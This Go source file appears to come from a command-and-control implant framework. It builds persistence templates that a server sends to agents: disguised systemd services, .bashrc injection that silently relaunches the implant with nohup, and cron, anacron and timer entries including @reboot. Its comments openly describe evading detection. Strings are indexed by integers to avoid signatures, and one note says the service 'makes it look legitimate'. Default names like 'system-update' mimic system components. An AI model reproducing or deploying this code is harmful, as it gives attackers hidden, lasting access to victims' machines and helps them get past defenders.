// internal/templates/persistence.go
package templates

import (
	"encoding/json"
)

// PersistenceTemplate represents server-side template data sent to agents
// Uses arrays instead of maps to avoid string keys in agent binaries
type PersistenceTemplate struct {
	Version   int      `json:"v"`   // Template version for future compatibility
	Type      int      `json:"t"`   // Template type as integer: 1=systemd, 2=bashrc, 3=cron, 4=launchd
	Templates []string `json:"tpl"` // Template strings indexed by position
	Params    []string `json:"p"`   // Parameters indexed by position
}

// Template type identifiers (integers avoid string signatures)
const (
	TypeSystemd = 1
	TypeBashrc  = 2
	TypeCron    = 3
	TypeLaunchd = 4
)

// ============================================================================
// SYSTEMD TEMPLATE INDICES (0-29)
// ============================================================================
const (
	IdxUnitHeader    = 0
	IdxDescPrefix    = 1
	IdxServiceSuffix = 2
	IdxAfterNetwork  = 3
	IdxWantsNetwork  = 4
	IdxServiceHeader = 5
	IdxTypeSimple    = 6
	IdxRestartAlways = 7
	IdxRestartSec    = 8
	IdxExecStart     = 9
	IdxStdOutNull    = 10
	IdxStdErrNull    = 11
	IdxSecComment    = 12
	IdxPrivateTmp    = 13
	IdxNoNewPrivs    = 14
	IdxProtectSys    = 15
	IdxProtectHome   = 16
	IdxReadWriteTmp  = 17
	IdxInstallHeader = 18
	IdxWantedBy      = 19
	// Systemd paths and strings
	IdxEtcSystemd           = 20 // /etc/systemd/system
	IdxDotConfig            = 21 // .config
	IdxSystemdDir           = 22 // systemd
	IdxUserDir              = 23 // user
	IdxServiceExt           = 24 // .service
	IdxMultiUserTargetWants = 25 // multi-user.target.wants
	IdxDefaultTargetWants   = 26 // default.target.wants
	IdxDefaultSvcName       = 27 // system-update
	IdxProcSelfExe          = 28 // /proc/self/exe
	_systemdEnd             = 29
)

// ============================================================================
// BASHRC TEMPLATE INDICES (30-49)
// ============================================================================
const (
	IdxBashIfSudo   = 30
	IdxBashIfPgrep  = 31
	IdxBashPgrepEnd = 32
	IdxBashNohup    = 33
	IdxBashNohupEnd = 34
	IdxBashFi       = 35
	IdxBashEndFi    = 36
	// RC file names
	IdxRcBashrc      = 37 // .bashrc
	IdxRcProfile     = 38 // .profile
	IdxRcBashProfile = 39 // .bash_profile
	IdxRcZshrc       = 40 // .zshrc
	// Detection patterns (for cleanup)
	IdxBashDetectPattern = 41 // if [ -z "$SUDO_COMMAND" ]; then
	_bashrcEnd           = 49
)

// ============================================================================
// CRON TEMPLATE INDICES (50-99)
// ============================================================================
const (
	// Script content
	IdxCronShebang     = 50
	IdxCronComment     = 51
	IdxCronDevNull     = 52
	IdxCronMaintHeader = 53
	IdxCronShellBash   = 54
	IdxCronPathEnv     = 55

	// Paths
	IdxCronEtcCronD      = 56
	IdxCronEtcAnacrontab = 57
	IdxCronEtcHourly     = 58
	IdxCronEtcDaily      = 59
	IdxCronEtcWeekly     = 60
	IdxCronEtcMonthly    = 61
	IdxCronSpoolCrontabs = 62
	IdxCronSpoolCron     = 63
	IdxCronSpoolTabs     = 64

	// Filenames
	IdxCronFileCheck  = 65
	IdxCronFileUpdate = 66
	IdxCronFileMaint  = 67

	// Intervals
	IdxCronIntHourly  = 68
	IdxCronIntDaily   = 69
	IdxCronIntWeekly  = 70
	IdxCronIntMonthly = 71
	IdxCronIntReboot  = 72

	// Systemd user timer
	IdxTimerUserDir     = 73
	IdxTimerHeader      = 74
	IdxTimerOnCalendar  = 75
	IdxTimerOnBootSec   = 76
	IdxTimerOnUnitSec   = 77
	IdxTimerPersistent  = 78
	IdxTimerExt         = 79
	IdxTimerDefaultName = 80

	// Cron methods (for dispatch - server transforms these)
	IdxCronMethodSpool    = 81
	IdxCronMethodCrond    = 82
	IdxCronMethodPeriodic = 83
	IdxCronMethodAnacron  = 84
	IdxCronMethodTimer    = 85
	IdxCronMethodAll      = 86

	// Cron actions
	IdxCronActionAdd    = 87
	IdxCronActionRemove = 88
	IdxCronActionList   = 89

	_cronEnd = 99
)

// ============================================================================
// PARAMETER INDICES (shared across template types)
// ============================================================================
const (
	ParamIdxServiceName = 0
	ParamIdxDescription = 1
	ParamIdxTarget      = 2
	ParamIdxUserService = 3
)

// ============================================================================
// TEMPLATE SIZE (ensures all indices have values)
// ============================================================================
const TemplateSize = 100

// GetLinuxSystemdTemplate returns the systemd service template for Linux persistence
func GetLinuxSystemdTemplate(serviceName, description string, userService bool) *PersistenceTemplate {
	target := "multi-user.target"
	if userService {
		target = "default.target"
	}

	if description == "" {
		if userService {
			description = "User Session Manager"
		} else {
			description = "System Update Monitor"
		}
	}

	if serviceName == "" {
		serviceName = "system-update"
	}

	// Pre-allocate array
	tpl := make([]string, TemplateSize)

	// Systemd unit content
	tpl[IdxUnitHeader] = "[Unit]"
	tpl[IdxDescPrefix] = "Description="
	tpl[IdxServiceSuffix] = " Service"
	tpl[IdxAfterNetwork] = "After=network.target network-online.target"
	tpl[IdxWantsNetwork] = "Wants=network-online.target"
	tpl[IdxServiceHeader] = "[Service]"
	tpl[IdxTypeSimple] = "Type=simple"
	tpl[IdxRestartAlways] = "Restart=always"
	tpl[IdxRestartSec] = "RestartSec=60"
	tpl[IdxExecStart] = "ExecStart="
	tpl[IdxStdOutNull] = "StandardOutput=null"
	tpl[IdxStdErrNull] = "StandardError=null"
	tpl[IdxSecComment] = "# Security hardening (makes it look legitimate)"
	tpl[IdxPrivateTmp] = "PrivateTmp=yes"
	tpl[IdxNoNewPrivs] = "NoNewPrivileges=true"
	tpl[IdxProtectSys] = "ProtectSystem=strict"
	tpl[IdxProtectHome] = "ProtectHome=read-only"
	tpl[IdxReadWriteTmp] = "ReadWritePaths=/tmp"
	tpl[IdxInstallHeader] = "[Install]"
	tpl[IdxWantedBy] = "WantedBy="

	// Systemd paths
	tpl[IdxEtcSystemd] = "/etc/systemd/system"
	tpl[IdxDotConfig] = ".config"
	tpl[IdxSystemdDir] = "systemd"
	tpl[IdxUserDir] = "user"
	tpl[IdxServiceExt] = ".service"
	tpl[IdxMultiUserTargetWants] = "multi-user.target.wants"
	tpl[IdxDefaultTargetWants] = "default.target.wants"
	tpl[IdxDefaultSvcName] = "system-update"
	tpl[IdxProcSelfExe] = "/proc/self/exe"

	// Also include bashrc templates for persist remove bashrc
	tpl[IdxBashIfSudo] = "if [ -z \"$SUDO_COMMAND\" ]; then"
	tpl[IdxBashIfPgrep] = "    if ! pgrep -f \""
	tpl[IdxBashPgrepEnd] = "\" > /dev/null 2>&1; then"
	tpl[IdxBashNohup] = "        (nohup "
	tpl[IdxBashNohupEnd] = " > /dev/null 2>&1 &) 2>/dev/null"
	tpl[IdxBashFi] = "    fi"
	tpl[IdxBashEndFi] = "fi"
	tpl[IdxRcBashrc] = ".bashrc"
	tpl[IdxRcProfile] = ".profile"
	tpl[IdxRcBashProfile] = ".bash_profile"
	tpl[IdxRcZshrc] = ".zshrc"
	tpl[IdxBashDetectPattern] = "if [ -z \"$SUDO_COMMAND\" ]; then"

	// Params
	params := make([]string, 4)
	params[ParamIdxServiceName] = serviceName
	params[ParamIdxDescription] = description
	params[ParamIdxTarget] = target
	params[ParamIdxUserService] = boolToString(userService)

	return &PersistenceTemplate{
		Version:   2, // Version 2 = array-based
		Type:      TypeSystemd,
		Templates: tpl,
		Params:    params,
	}
}

// GetLinuxBashrcTemplate returns the bashrc injection template for Linux persistence
func GetLinuxBashrcTemplate() *PersistenceTemplate {
	tpl := make([]string, TemplateSize)

	// Bashrc injection templates
	tpl[IdxBashIfSudo] = "if [ -z \"$SUDO_COMMAND\" ]; then"
	tpl[IdxBashIfPgrep] = "    if ! pgrep -f \""
	tpl[IdxBashPgrepEnd] = "\" > /dev/null 2>&1; then"
	tpl[IdxBashNohup] = "        (nohup "
	tpl[IdxBashNohupEnd] = " > /dev/null 2>&1 &) 2>/dev/null"
	tpl[IdxBashFi] = "    fi"
	tpl[IdxBashEndFi] = "fi"

	// RC file names
	tpl[IdxRcBashrc] = ".bashrc"
	tpl[IdxRcProfile] = ".profile"
	tpl[IdxRcBashProfile] = ".bash_profile"
	tpl[IdxRcZshrc] = ".zshrc"

	// Detection pattern for cleanup
	tpl[IdxBashDetectPattern] = "if [ -z \"$SUDO_COMMAND\" ]; then"

	// Also include /proc/self/exe for default command
	tpl[IdxProcSelfExe] = "/proc/self/exe"

	return &PersistenceTemplate{
		Version:   2,
		Type:      TypeBashrc,
		Templates: tpl,
		Params:    []string{},
	}
}

// GetLinuxCronTemplate returns the cron persistence template for Linux
func GetLinuxCronTemplate() *PersistenceTemplate {
	tpl := make([]string, TemplateSize)

	// Script content
	tpl[IdxCronShebang] = "#!/bin/bash"
	tpl[IdxCronComment] = "# Added by system at"
	tpl[IdxCronDevNull] = ">/dev/null 2>&1"
	tpl[IdxCronMaintHeader] = "# System maintenance task"
	tpl[IdxCronShellBash] = "SHELL=/bin/bash"
	tpl[IdxCronPathEnv] = "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin"

	// Paths
	tpl[IdxCronEtcCronD] = "/etc/cron.d"
	tpl[IdxCronEtcAnacrontab] = "/etc/anacrontab"
	tpl[IdxCronEtcHourly] = "/etc/cron.hourly"
	tpl[IdxCronEtcDaily] = "/etc/cron.daily"
	tpl[IdxCronEtcWeekly] = "/etc/cron.weekly"
	tpl[IdxCronEtcMonthly] = "/etc/cron.monthly"
	tpl[IdxCronSpoolCrontabs] = "/var/spool/cron/crontabs/%s"
	tpl[IdxCronSpoolCron] = "/var/spool/cron/%s"
	tpl[IdxCronSpoolTabs] = "/var/spool/cron/tabs/%s"

	// Filenames
	tpl[IdxCronFileCheck] = "system-check"
	tpl[IdxCronFileUpdate] = "system-update"
	tpl[IdxCronFileMaint] = "system-maint"

	// Intervals
	tpl[IdxCronIntHourly] = "@hourly"
	tpl[IdxCronIntDaily] = "@daily"
	tpl[IdxCronIntWeekly] = "@weekly"
	tpl[IdxCronIntMonthly] = "@monthly"
	tpl[IdxCronIntReboot] = "@reboot"

	// Systemd user timer
	tpl[IdxTimerUserDir] = ".config/systemd/user"
	tpl[IdxTimerHeader] = "[Timer]"
	tpl[IdxTimerOnCalendar] = "OnCalendar="
	tpl[IdxTimerOnBootSec] = "OnBootSec="
	tpl[IdxTimerOnUnitSec] = "OnUnitActiveSec="
	tpl[IdxTimerPersistent] = "Persistent=true"
	tpl[IdxTimerExt] = ".timer"
	tpl[IdxTimerDefaultName] = "update-manager"

	// Also include /proc/self/exe
	tpl[IdxProcSelfExe] = "/proc/self/exe"

	return &PersistenceTemplate{
		Version:   2,
		Type:      TypeCron,
		Templates: tpl,
		Params:    []string{},
	}
}

// ToJSON serializes the template to JSON bytes
func (t *PersistenceTemplate) ToJSON() ([]byte, error) {
	return json.Marshal(t)
}

// ParsePersistenceTemplate deserializes JSON to a PersistenceTemplate
func ParsePersistenceTemplate(data []byte) (*PersistenceTemplate, error) {
	var t PersistenceTemplate
	if err := json.Unmarshal(data, &t); err != nil {
		return nil, err
	}
	return &t, nil
}

func boolToString(b bool) string {
	if b {
		return "true"
	}
	return "false"
}
